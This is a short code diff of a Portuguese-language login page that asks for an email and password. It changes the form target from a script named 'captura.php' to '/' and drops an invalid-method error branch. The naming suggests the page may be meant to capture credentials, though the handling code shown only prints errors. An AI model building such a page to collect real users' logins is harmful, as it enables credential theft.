@@ -8,7 +8,7 @@
 </head>
 
 <body>
-  <form action="captura.php" method="post">
+  <form action="/" method="post">
     <label for="email">Email:</label>
     <input type="email" id="email" name="email" required><br>
     <label for="senha">Senha:</label>
@@ -41,9 +41,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // Nenhum dado recebido
         echo 'Erro: Envie email e senha!';
     }
-} else {
-    // Método de requisição inválido
-    echo 'Erro: Método de requisição inválido!';
 }
 ?>
 
